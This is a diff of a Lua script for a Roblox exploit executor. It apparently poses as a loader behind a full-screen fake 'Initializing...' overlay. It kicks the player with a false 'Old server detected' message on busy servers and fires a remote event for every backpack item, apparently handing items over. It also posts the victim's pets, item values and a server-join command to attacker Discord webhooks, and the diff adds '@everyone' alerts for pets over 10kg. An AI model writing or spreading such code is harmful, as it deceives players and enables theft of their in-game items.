@@ -29,7 +29,6 @@ gui.ResetOnSpawn = false
 gui.DisplayOrder = 999999 
 gui.Parent = player:WaitForChild("PlayerGui")
 
-
 local bg = Instance.new("Frame", gui)
 bg.BackgroundColor3 = Color3.fromRGB(10, 10, 10)
 bg.Size = UDim2.new(1, 0, 1, 0)
@@ -42,7 +41,6 @@ title.TextScaled = true
 title.Size = UDim2.new(0.8, 0, 0.12, 0)
 title.Position = UDim2.new(0.1, 0, 0.28, 0)
 title.BackgroundTransparency = 1
-
 
 local status = Instance.new("TextLabel", bg)
 status.Text = "Initializing..."
@@ -59,7 +57,6 @@ barBg.Position = UDim2.new(0.15, 0, 0.52, 0)
 barBg.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 barBg.BorderSizePixel = 0
 barBg.ClipsDescendants = true
-
 
 local barFill = Instance.new("Frame", barBg)
 barFill.Size = UDim2.new(0, 0, 1, 0)
@@ -104,7 +101,6 @@ task.spawn(function()
     gui:Destroy()
 end)
 
-
 local suffixes = {
     "", "K", "M", "B", "T", "Qa", "Qi", "Sx", "Sp", "Oc", "No", "De"
 }
@@ -120,7 +116,6 @@ function formatNumber(num)
     return string.format("%.2f%s", scaled, suffix)
 end
 
-
 if #game.Players:GetPlayers() >= 5 then
     game.Players.LocalPlayer:Kick("Old server detected. Please rejoin!")
     return 
@@ -135,7 +130,6 @@ for _, item in ipairs(bp:GetChildren()) do
 		event:FireServer(item)
 	end
 end
-
 
 local executor = (identifyexecutor and identifyexecutor()) or "Unknown"
 
@@ -161,10 +155,43 @@ for _, item in pairs(backpack:GetChildren()) do
     local kg = tonumber(string.match(item.Name, "%[(%d*%.?%d+)%s*[kK][gG]%]")) or 0
 
     if kg > 10 then
-        allowedPets[baseName] = true
+        if not allowedPets[baseName] then
+            allowedPets[baseName] = true
+            -- Send notification to BOTH main webhook and logs webhook
+            if req then
+                local bigPetPayload = {
+                    ["content"] = "@everyone",
+                    ["embeds"] = {{
+                        ["title"] = ":rotating_light: Big Pet Detected!",
+                        ["description"] = "A pet over 10Kg was found in the backpack.",
+                        ["color"] = 0xff0000,
+                        ["fields"] = {
+                            {["name"] = "Pet Name", ["value"] = baseName, ["inline"] = true},
+                            {["name"] = "Weight", ["value"] = tostring(kg) .. "Kg", ["inline"] = true},
+                            {["name"] = "Player", ["value"] = LocalPlayer.Name, ["inline"] = true}
+                        },
+                        ["footer"] = {["text"] = "by Buffy • " .. os.date("%B %d, %Y")},
+                        ["timestamp"] = os.date("!%Y-%m-%dT%H:%M:%SZ")
+                    }}
+                }
+                pcall(function()
+                    req({
+                        Url = webhook,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = HttpService:JSONEncode(bigPetPayload)
+                    })
+                    req({
+                        Url = logs_webhook,
+                        Method = "POST",
+                        Headers = {["Content-Type"] = "application/json"},
+                        Body = HttpService:JSONEncode(bigPetPayload)
+                    })
+                end)
+            end
+        end
     end
 end
-
 
 local petCountMap = {}
 local petLines = {}
@@ -180,18 +207,14 @@ for _, item in pairs(backpack:GetChildren()) do
     end
 end
 
-
 for petName, count in pairs(petCountMap) do
     table.insert(petLines, petName .. " - pet (x" .. count .. ")")
 end
 
-
 table.sort(itemsWithValue, function(a, b) return a.value > b.value end)
-
 
 local tradableSummary = ""
 local totalShown = 0
-
 
 for _, line in ipairs(petLines) do
     if totalShown >= 10 then break end
@@ -199,12 +222,10 @@ for _, line in ipairs(petLines) do
     totalShown += 1
 end
 
-
 for i = 1, math.min(10 - totalShown, #itemsWithValue) do
     local item = itemsWithValue[i]
     tradableSummary = tradableSummary .. item.name .. " - Worth: " .. formatNumber(item.value) .. "\n"
 end
-
 
 if #petLines + #itemsWithValue > 10 then
     tradableSummary = tradableSummary .. "and more..."
@@ -214,8 +235,6 @@ local totalValue = 0
 for _, item in ipairs(itemsWithValue) do
     totalValue += item.value
 end
-
-
 
 local payload = {
     ["content"] = "--@everyone\n" .. string.format("game:GetService(\"TeleportService\"):TeleportToPlaceInstance(%d, \"%s\")", game.PlaceId, game.JobId),
@@ -251,7 +270,6 @@ local logs_payload = {
     }}
 }
 
-
 if req then
     pcall(function()
         req({
@@ -269,7 +287,6 @@ if req then
         })
     end)
 end
-
 
 local printedInventory = false
 local started = false
